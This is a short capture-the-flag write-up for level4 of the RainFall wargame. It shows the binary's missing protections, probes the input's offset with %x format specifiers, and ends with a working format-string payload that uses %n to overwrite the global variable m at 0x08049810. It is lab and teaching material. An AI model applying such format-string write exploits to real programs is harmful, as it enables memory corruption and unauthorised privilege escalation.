```
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
```

This seems pretty similar, same fgets call, different printf

We can try and find the index of our input string

```
level4@RainFall:~$ python -c 'print("AAAA%x " * 20)' | ./level4 
AAAAb7ff26b0 AAAAbffff794 AAAAb7fd0ff4 AAAA0 AAAA0 AAAAbffff758 AAAA804848d AAAAbffff550 AAAA200 AAAAb7fd1ac0 AAAAb7ff37d0 AAAA41414141 AAAA41207825 AAAA25414141 AAAA41412078 AAAA78254141 AAAA41414120 AAAA20782541 AAAA41414141 AAAA41207825 
```

Index 12 it seems.

Now to get the address of m with gdb, 0x08049810
So if we try like like times it gives us

```
level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "%16930112d%12$n")'| ./level4
```